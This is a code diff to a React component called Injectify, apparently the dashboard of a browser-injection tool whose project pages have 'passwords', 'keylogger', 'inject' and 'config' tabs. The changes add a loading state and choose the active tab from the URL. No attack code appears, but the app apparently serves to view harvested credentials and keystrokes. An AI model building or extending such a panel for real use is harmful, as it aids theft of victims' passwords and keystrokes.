@@ -51,6 +51,7 @@ class Injectify extends Component {
 		height: '0',
 		notify: false,
 		notifyOpen: false,
+		loading: false,
 	}
 
 	constructor(props) {
@@ -59,6 +60,7 @@ class Injectify extends Component {
 	}
 
 	componentDidMount() {
+		if (window.location.pathname !== '/') this.loading(true)
 		this.updateWindowDimensions()
 		window.addEventListener('resize', this.updateWindowDimensions)
 		if (loc.token) {
@@ -126,9 +128,10 @@ class Injectify extends Component {
 			if (window.location.pathname.toLowerCase().slice(0, 10) == "/projects/") {
 				let project = window.location.pathname.slice(10).split("/")[0]
 				let type = 'passwords'
-				if (window.location.href.slice(-10) == "/keylogger") type = 'keylogger'
-				if (window.location.href.slice(-7 ) == "/inject") type = 'inject'
-				if (window.location.href.slice(-7 ) == "/config") type = 'config'
+				let tab = 0
+				if (window.location.href.slice(-10) == "/keylogger") { type = 'keylogger'; tab = 1 }
+				if (window.location.href.slice(-7 ) == "/inject") { type = 'inject'; tab = 2 }
+				if (window.location.href.slice(-7 ) == "/config") { type = 'config'; tab = 3 }
 				if (project) {
 					if (type !== 'config') {
 						socket.emit("project:read", {
@@ -139,6 +142,9 @@ class Injectify extends Component {
 					socket.emit("project:read", {
 						name: decodeURIComponent(project),
 						type: type
+					})
+					this.setState({
+						tab: tab
 					})
 				}
 			}
@@ -156,6 +162,7 @@ class Injectify extends Component {
 		})
 		socket.on(`project:read`, collection => {
 			console.log("%c[websocket] " + "%cproject:read =>", "color: #ef5350", "color:  #FF9800", collection)
+			this.loading(true)
 			if (collection.type == 'overview' || collection.type == 'config') {
 				this.setState({
 					project: {
@@ -293,6 +300,12 @@ class Injectify extends Component {
 			return true
 		}
 	}
+	
+	loading = value => {
+		this.setState({
+			loading: value
+		})
+	}
 
 	render() {
 		return (
@@ -309,6 +322,8 @@ class Injectify extends Component {
 					  notify={this.notify.bind(this)}
 					  ref={instance => { this.main = instance }}
 					  setTab={tab => this.setState({ tab: tab })}
+					  setLoading={this.loading.bind(this)}
+					  loading={this.state.loading}
 					>
 						{this.state.user.login ? (
 							<div>
